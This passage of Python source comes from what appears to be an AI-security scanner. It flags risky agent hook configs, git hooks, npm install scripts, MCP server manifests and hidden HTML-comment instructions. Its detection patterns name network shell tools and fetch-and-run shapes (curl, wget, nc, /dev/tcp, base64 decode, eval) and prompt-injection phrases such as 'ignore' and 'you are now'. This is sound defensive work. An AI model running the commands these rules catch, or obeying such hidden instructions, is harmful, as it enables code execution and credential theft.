                f"This file had more than {_DECODE_MAX_CANDIDATES_PER_FILE} candidate encoded "
                f"blobs or exceeded {_DECODE_MAX_BYTES_PER_FILE} decoded bytes; the remainder "
                "were not decoded or rescanned."
            ),
            snippet=f"candidates_processed={candidates}; decoded_bytes={decoded_bytes}",
            fix="Split the file, or narrow --exclude, to bring it under the decode budget.",
            references=[REF_LLM],
        ))
    return findings


# --------------------------------------------------------------------------- #
# D. Dangerous hooks & supply-chain lifecycle scripts
# --------------------------------------------------------------------------- #

# Agent hook-event names across vendors. A hostile hook config is the same attack
# whichever assistant loads it, so this must not be one vendor's vocabulary.
#
# ⚠️ The case-insensitive flag is doing less work than it looks like it is. It
# makes Cursor's `preToolUse` / `postToolUse` match Claude's spellings for free,
# which is why a path-only fix appeared to work -- but `beforeShellExecution`,
# `afterFileEdit` and `beforeSubmitPrompt` are Cursor-native names with no Claude
# counterpart, so a config using only those stayed invisible. Measured against a
# real `~/.cursor/hooks.json` wiring six auto-run commands: zero findings.
AGENT_HOOK_EVENTS = re.compile(
    r"(?i)\b("
    # Claude Code
    r"SessionStart|SessionEnd|PostToolUse|PreToolUse|UserPromptSubmit|Stop|SubagentStop|PreCompact|Notification"
    # Cursor
    r"|beforeShellExecution|beforeReadFile|afterFileEdit|beforeSubmitPrompt|beforeMCPExecution|stop"
    # Windsurf / Codeium, Cline / Roo
    r"|onFileEdit|onCommandRun|preCommand|postCommand"
    r")\b"
)
# Retained under the old name: this module is imported by tests and tools that
# reference it. Renaming without an alias is a silent break for any consumer.
CC_HOOK_EVENTS = AGENT_HOOK_EVENTS

# Directory prefixes and filenames that indicate an AGENT hook/settings config.
# 🔴 Every Claude-specific entry STAYS. Detecting Claude formats was never the
# defect -- detecting ONLY them was.
AGENT_CONFIG_DIRS = (".claude/", ".cursor/", ".windsurf/", ".codeium/", ".roo/", ".cline/", ".gemini/")
AGENT_CONFIG_NAMES = ("settings.json", "settings.local.json", "hooks.json",
                      "cline_settings.json", "windsurf_settings.json")


def _is_agent_hook_config(low_rel: str, base: str) -> bool:
    """True when this path is an agent's hook/settings config, for ANY vendor."""
    if base in AGENT_CONFIG_NAMES:
        return True
    padded = "/" + low_rel
    return any(d in padded or low_rel.startswith(d) for d in AGENT_CONFIG_DIRS)
# ⚠️ GIT_HOOK_NAMES comes from `core` -- the SAME set the walker uses to decide
# what to open. It used to be a 9-name copy here, survivable only because the
# path predicate also fired on *any* directory called `hooks/`, which quietly
# covered `commit-msg`, `pre-receive`, `update` and the rest. That broad clause
# is gone (it was matching agent/plugin hook directories -- see `_is_git_hook`),
# so completeness is now load-bearing, and a second copy would rot.
NPM_LIFECYCLE = re.compile(r"(?i)\"(preinstall|install|postinstall|prepare|prepublish)\"\s*:\s*\"([^\"]+)\"")

# Evidence for `git-hook-network-exec`, split so the rule cannot fire without the
# thing its own name asserts.
#
# 🔴 It previously fired on a single regex that included `python -c`, `node -e`,
# `base64` and `powershell` -- so `if python3 -c 'import sys'` inside a Claude
# Code plugin's `hooks/` directory produced a HIGH "Git hook performs network/exec
# on a git event": not a git hook, no network, no exec of fetched content. The
# rule's NAME asserted evidence its predicate never required, which is this
# project's own recurring defect class aimed back at itself.
# ⚠️ TWO EVIDENCE BARS, DELIBERATELY DIFFERENT -- do not "unify" them.
#
# `EXEC_IN_HOOK` (broad) serves `agent-hook-autorun-dangerous`, whose claim is
# "this command performs network/exec/ENCODING operations" on an assistant event.
# For that rule a bare `python -c` genuinely is the risk: an agent hook config
# auto-runs it at load time, from a file an attacker may have supplied.
#
# `NETWORK_IN_HOOK` / `OPAQUE_EXEC_IN_HOOK` (narrow) serve `git-hook-network-exec`,
# whose claim is specifically network access or execution of fetched content on a
# git operation. Reusing the broad pattern there is what produced the false
# positive: the rule's name asserted evidence its predicate never required.
#
# The lesson generalises past these two rules: the evidence bar belongs to the
# CLAIM, not to the file. One shared regex serving two different claims will
# always over-fire for the narrower one.
EXEC_IN_HOOK = re.compile(
    r"(?i)(curl|wget|Invoke-WebRequest|iwr|nc\b|bash\s+-c|sh\s+-c|eval\b|base64\b|node\s+-e|python[0-9.]*\s+-c|powershell)"
)

NETWORK_IN_HOOK = re.compile(
    r"(?i)(\b(curl|wget|Invoke-WebRequest|iwr|ncat|telnet)\b|\bnc\s+-|/dev/tcp/)"
)
# Executing content the hook did not author: piping into an interpreter, `eval`,
# PowerShell's `iex`, or decoding a blob to run it. A bare interpreter call
# (`python3 -c`, `node -e`) is how ordinary hooks work and is NOT this.
OPAQUE_EXEC_IN_HOOK = re.compile(
    r"(?i)(\|\s*(sh|bash|zsh|pwsh|powershell|python[0-9.]*|node)\b|\beval\b|\biex\b"
    r"|base64\s+(-d|-D|--decode))"
)


def _is_git_hook(base: str) -> bool:
    """True only for a file git would really run as a hook.

    Name-based, because that is what git itself honours (in `.git/hooks/` or any
    `core.hooksPath`). A `.sample` is never executed by git, and a plugin's
    `hooks/pre-tool-use.sh` is not a git hook however much its directory looks
    like one.
    """
    if base.endswith(".sample"):
        return False
    stem = base.rsplit(".", 1)[0] if "." in base else base
    return base in GIT_HOOK_NAMES or stem in GIT_HOOK_NAMES


def _scan_hooks(text: str, rel: str) -> list:
    out: list = []
    low_rel = rel.lower()
    base = os.path.basename(low_rel)

    # --- agent hook config (Claude .claude/*, Cursor .cursor/hooks.json, ...) ---
    if _is_agent_hook_config(low_rel, base) and AGENT_HOOK_EVENTS.search(text) and '"command"' in text.lower():
        for m in re.finditer(r"(?i)\"command\"\s*:\s*\"([^\"]+)\"", text):
            cmd = m.group(1)
            ln = text.count("\n", 0, m.start()) + 1
            dangerous = bool(EXEC_IN_HOOK.search(cmd))
            out.append(Finding(
                engine="aisec",
                # ⚠️ BOTH ids renamed together. Renaming only the bare id would have
                # left `claude-hook-autorun-dangerous` behind -- orphaning the HIGH
                # severity variant while the MEDIUM one moved. One ternary, two ids.
                rule_id="agent-hook-autorun-dangerous" if dangerous else "agent-hook-autorun",
                title="Auto-run agent hook executes a shell command"
                      + (" (network/exec)" if dangerous else ""),
                severity=Severity.HIGH if dangerous else Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                file=rel, line=ln, category="DANGEROUS_HOOK",
                description=("An agent hook runs a command automatically on an assistant event. "
                             + ("It performs network/exec/encoding operations -- a strong load-time "
                                "code-execution / exfiltration risk." if dangerous
                                else "Review what it does before trusting this config.")),
                snippet=(cmd[:160] + ("..." if len(cmd) > 160 else "")),
                fix="Audit every auto-run hook command; do not accept hook config from untrusted sources.",
                cwe="CWE-829", owasp="LLM05: Supply Chain", references=[REF_LLM],
            ))

    # --- git hooks: by NAME (what git runs), and only on real evidence ---
    if _is_git_hook(base):
        net = NETWORK_IN_HOOK.search(text)
        opaque = OPAQUE_EXEC_IN_HOOK.search(text)
        m = net or opaque
        if m:
            ln = text.count("\n", 0, m.start()) + 1
            got = [n for n, hit in (("network access", net), ("execution of opaque/fetched content", opaque)) if hit]
            out.append(Finding(
                engine="aisec", rule_id="git-hook-network-exec",
                title="Git hook performs network/exec on a git event",
                severity=Severity.HIGH, confidence=Confidence.LOW,
                file=rel, line=ln, category="DANGEROUS_HOOK",
                # State the evidence actually found, so the reader can tell a
                # fetch-into-shell from an `eval` without opening the file.
                description=(
                    "A git hook runs automatically on git operations and shows "
                    + " and ".join(got) + "."
                ),
                snippet=split_lines(text)[ln - 1].strip()[:160] if ln - 1 < len(split_lines(text)) else "",
                fix="Review committed git hooks; a repo should not ship hooks that curl|sh or eval.",
                cwe="CWE-829", owasp="LLM05: Supply Chain", references=[REF_LLM],
            ))

    # --- npm lifecycle scripts ---
    if base == "package.json":
        for m in NPM_LIFECYCLE.finditer(text):
            phase, cmd = m.group(1), m.group(2)
            ln = text.count("\n", 0, m.start()) + 1
            dangerous = bool(EXEC_IN_HOOK.search(cmd))
            if dangerous:
                out.append(Finding(
                    engine="aisec", rule_id="npm-lifecycle-exec",
                    title=f"npm '{phase}' lifecycle script runs network/exec",
                    severity=Severity.HIGH, confidence=Confidence.MEDIUM,
                    file=rel, line=ln, category="SUPPLY_CHAIN",
                    description=(f"The npm '{phase}' script executes automatically on install and performs "
                                 "network/exec operations -- a common supply-chain compromise vector."),
                    snippet=cmd[:160],
                    fix="Remove install-time network/exec; vet dependencies whose install scripts do this.",
                    cwe="CWE-506", owasp="LLM05: Supply Chain", references=[REF_LLM],
                ))
    return out


# --------------------------------------------------------------------------- #
# HTML comment with instruction-like content (multi-line, markdown/html)
# --------------------------------------------------------------------------- #

HTML_COMMENT = re.compile(r"<!--(.*?)-->", re.DOTALL)
COMMENT_SUSPICIOUS = re.compile(
    r"(?i)(ignore|disregard|system\s*:|assistant\s*:|instruction|you\s+are\s+now|run\s+this|execute|curl|password|secret|api[_\-]?key|do\s+not\s+tell)"
)


def _scan_html_comments(text: str, rel: str) -> list:
    out: list = []
    if not rel.lower().endswith((".md", ".markdown", ".mdx", ".mdc", ".html", ".htm", ".rst", ".txt")):
        return out
    for m in HTML_COMMENT.finditer(text):
        body = m.group(1)
        if COMMENT_SUSPICIOUS.search(body):
            ln = text.count("\n", 0, m.start()) + 1
            out.append(Finding(
                engine="aisec", rule_id="hidden-instruction-html-comment",
                title="Instruction-like content hidden in an HTML comment",
                severity=Severity.HIGH, confidence=Confidence.MEDIUM,
                file=rel, line=ln, category="HIDDEN_CONTENT",
                description=("An HTML comment (invisible when rendered) contains instruction- or "
                             "secret-like text -- a prompt-injection channel in docs an agent may read."),
                snippet=re.sub(r"\s+", " ", body).strip()[:160],
                fix="Remove hidden instruction text; agents should ignore instructions carried in content.",
                cwe="CWE-1007", owasp="LLM01: Prompt Injection", references=[REF_LLM],
            ))
    return out


# --------------------------------------------------------------------------- #
# E. MCP server manifests
#
# An MCP server is a process the agent STARTS AUTOMATICALLY at load and then
# trusts for the whole session -- the same load-time execution risk as an auto-run
# hook, with a longer lifetime and a broader tool surface.
#
# 🔴 Keyed on PARSED JSON STRUCTURE, never on the string "mcpServers".
# Documentation about MCP contains that string constantly; a substring match would
# flag every doc discussing the feature -- the self-noise class this scanner has
# repeatedly demonstrated on its own tree. Requiring a real object with real server
# entries costs nothing and cannot match prose.
# --------------------------------------------------------------------------- #

MCP_MANIFEST_NAMES = {".mcp.json", "mcp.json", "claude_desktop_config.json",
                      "mcp_settings.json", "cline_mcp_settings.json"}

# Env var names that carry a credential into a third-party server process.
MCP_CRED_ENV = re.compile(r"(?i)(token|secret|passwd|password|credential|api[_-]?key|_key$|auth)")

# Command shapes that fetch and execute code at server start.
MCP_REMOTE_EXEC = re.compile(
    r"(?i)(https?://|\bcurl\b|\bwget\b|Invoke-WebRequest|\biwr\b|\bbash\s+-c|\bsh\s+-c|\beval\b|@latest\b|@\*)"
)


def _mcp_line_of(text: str, name: str) -> int:
    m = re.search(r'"' + re.escape(name) + r'"\s*:', text)
    return text.count("\n", 0, m.start()) + 1 if m else 1


def _scan_mcp(text: str, rel: str) -> list:
    """Flag MCP servers a manifest would auto-start, and credentials handed to them."""
    base = os.path.basename(rel.lower())
    if base not in MCP_MANIFEST_NAMES and '"mcpServers"' not in text:
        return []
    try:
        data = json.loads(text)
    except (ValueError, RecursionError):
        return []  # fail safe: unparseable is not evidence of anything
    if not isinstance(data, dict):
        return []

    servers = data.get("mcpServers")
    if not isinstance(servers, dict):
        return []

    out: list = []
    for name, cfg in servers.items():
        if not isinstance(cfg, dict):
            continue
        ln = _mcp_line_of(text, str(name))
        command = str(cfg.get("command", ""))
        args = cfg.get("args") if isinstance(cfg.get("args"), list) else []
        invocation = " ".join([command] + [str(a) for a in args]).strip()
        if not invocation:
            continue

        remote = bool(MCP_REMOTE_EXEC.search(invocation))
        out.append(Finding(
            engine="aisec",
            rule_id="mcp-server-autostart-remote" if remote else "mcp-server-autostart",
            title=("MCP server auto-starts from a remote/unpinned source" if remote
                   else "MCP server auto-starts a local command"),
            severity=Severity.HIGH if remote else Severity.MEDIUM,
            confidence=Confidence.MEDIUM,
            file=rel, line=ln, category="DANGEROUS_HOOK",
            description=(
                f"The MCP server '{name}' is started automatically when the agent loads this "
                "config, and is then trusted to serve tools for the whole session. "
                + ("Its invocation fetches or executes code from a remote or unpinned source, so "
                   "what runs can change without the config changing."
                   if remote else
                   "Review what the command does before trusting this config.")
            ),
            snippet=invocation[:160] + ("..." if len(invocation) > 160 else ""),
            fix=("Pin the server to an exact version from a source you control, and audit it before "
                 "adoption; never accept MCP config from an untrusted repo."),
            cwe="CWE-829", owasp="LLM05: Supply Chain", references=[REF_LLM],
        ))

        env = cfg.get("env")
        if isinstance(env, dict):
            leaked = sorted(k for k in env if MCP_CRED_ENV.search(str(k)))
            if leaked:
                out.append(Finding(
                    engine="aisec", rule_id="mcp-server-credential-env",
                    title="Credential passed into an MCP server process",
                    severity=Severity.HIGH, confidence=Confidence.MEDIUM,
                    file=rel, line=ln, category="EXFIL",
                    description=(
                        f"The MCP server '{name}' receives credential-shaped environment variables "
                        f"({', '.join(leaked[:5])}). Whatever that server does with them is outside "
                        "this repo, and it holds them for the whole session."
                    ),
                    snippet=", ".join(leaked[:5])[:160],
                    fix=("Scope the credential to the minimum the server needs, prefer a short-lived "
                         "token, and confirm the server is one you have audited."),
                    cwe="CWE-522", owasp="LLM06: Sensitive Information Disclosure", references=[REF_LLM],
                ))
    return out


# --------------------------------------------------------------------------- #
# Engine entry
# --------------------------------------------------------------------------- #

def scan(scan_files, read_text) -> list:
    findings: list = []
    for sf in scan_files:
        text = read_text(sf.abspath)
        if not text:
            continue
        rel = sf.relpath

        findings.extend(_scan_unicode(text, rel))
        findings.extend(_scan_homoglyphs(text, rel))
        findings.extend(_scan_html_comments(text, rel))
        findings.extend(_scan_hooks(text, rel))
        findings.extend(_scan_mcp(text, rel))
        findings.extend(_scan_decoded(text, rel))

        lines = split_lines(text)
        skipped = 0
        for i, line in enumerate(lines, start=1):
            if len(line) > 6000:
                skipped += 1
                continue
            for group in (INJECTION, EXFIL):
                for rule_id, title, rx, sev, conf, cat, cwe, owasp, fix in group:
                    if rx.search(line):
                        findings.append(Finding(
                            engine="aisec", rule_id=rule_id, title=title,
                            severity=sev, confidence=conf, file=rel, line=i, category=cat,
                            description=title + ".",
                            snippet=line.strip()[:200],
                            fix=fix, cwe=cwe, owasp=owasp, references=[REF_LLM],
                        ))
        if skipped and not any(f.file == rel and f.category == "COVERAGE" for f in findings):
            findings.append(Finding(
                engine="aisec", rule_id="aisec-long-line-skip",
                title="AI-security coverage limited by long line",
                severity=Severity.INFO, confidence=Confidence.HIGH,
                file=rel, line=1, category="COVERAGE",
                description=f"{skipped} line(s) exceeded the 6000-character analysis cap and were skipped by injection/exfiltration scanning.",
                snippet=f"skipped_lines={skipped}; cap=6000",
                fix="Split oversized lines before scanning to restore full AI-security coverage.",
                references=[REF_LLM],
            ))
    return findings
